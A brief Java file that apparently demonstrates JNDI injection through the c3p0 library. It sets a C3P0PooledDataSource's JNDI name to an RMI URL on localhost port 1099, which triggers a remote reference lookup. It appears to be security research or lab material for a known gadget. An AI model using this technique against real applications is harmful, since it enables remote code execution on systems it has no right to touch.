package C3P0;

import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.mchange.v2.c3p0.jboss.C3P0PooledDataSource;


import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
public class c3p0_jndi_setter {
    public static void main(String[] args) throws IOException, NamingException, ClassNotFoundException {
        C3P0PooledDataSource datasource = new C3P0PooledDataSource();
        datasource.setJndiName("rmi://127.0.0.1:1099/pysnow");
    }


}